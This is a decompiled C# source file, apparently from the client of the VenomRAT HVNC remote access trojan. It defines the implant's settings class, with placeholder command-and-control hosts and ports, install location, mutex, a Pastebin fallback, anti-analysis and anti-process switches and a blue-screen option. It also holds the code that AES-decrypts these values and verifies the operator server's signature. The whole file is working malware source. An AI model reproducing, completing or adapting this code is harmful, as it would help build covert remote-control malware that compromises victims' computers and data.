// Decompiled with JetBrains decompiler
// Type: Client.Settings
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using Client.Algorithm;
using Client.Helper;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
  public static class Settings
  {
    public static string Por_ts = "%Ports%";
    public static string Hos_ts = "%Hosts%";
    public static string Ver_sion = "%Version%";
    public static string In_stall = "%Install%";
    public static string Install_Folder = "%Folder%";
    public static string Install_File = "%File%";
    public static string Key = "%Key%";
    public static string MTX = "%MTX%";
    public static string Certifi_cate = "%Certificate%";
    public static string Server_signa_ture = "%Serversignature%";
    public static X509Certificate2 Server_Certificate;
    public static Aes256 aes256;
    public static string Paste_bin = "%Paste_bin%";
    public static string BS_OD = "%BSOD%";
    public static string Hw_id = (string) null;
    public static string De_lay = "%Delay%";
    public static string Group = "%Group%";
    public static string Anti_Process = "%AntiProcess%";
    public static string An_ti = "%Anti%";

    public static bool InitializeSettings()
    {
      try
      {
        Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
        Settings.aes256 = new Aes256(Settings.Key);
        Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts);
        Settings.Hos_ts = Settings.aes256.Decrypt(Settings.Hos_ts);
        Settings.Ver_sion = Settings.aes256.Decrypt(Settings.Ver_sion);
        Settings.In_stall = Settings.aes256.Decrypt(Settings.In_stall);
        Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
        Settings.Paste_bin = Settings.aes256.Decrypt(Settings.Paste_bin);
        Settings.An_ti = Settings.aes256.Decrypt(Settings.An_ti);
        Settings.Anti_Process = Settings.aes256.Decrypt(Settings.Anti_Process);
        Settings.BS_OD = Settings.aes256.Decrypt(Settings.BS_OD);
        Settings.Group = Settings.aes256.Decrypt(Settings.Group);
        Settings.Hw_id = HwidGen.HWID();
        Settings.Server_signa_ture = Settings.aes256.Decrypt(Settings.Server_signa_ture);
        Settings.Server_Certificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certifi_cate)));
        return Settings.VerifyHash();
      }
      catch
      {
        return false;
      }
    }

    private static bool VerifyHash()
    {
      try
      {
        using (SHA256Managed shA256Managed = new SHA256Managed())
          return ((RSACryptoServiceProvider) Settings.Server_Certificate.PublicKey.Key).VerifyHash(shA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Server_signa_ture));
      }
      catch (Exception ex)
      {
        return false;
      }
    }
  }
}
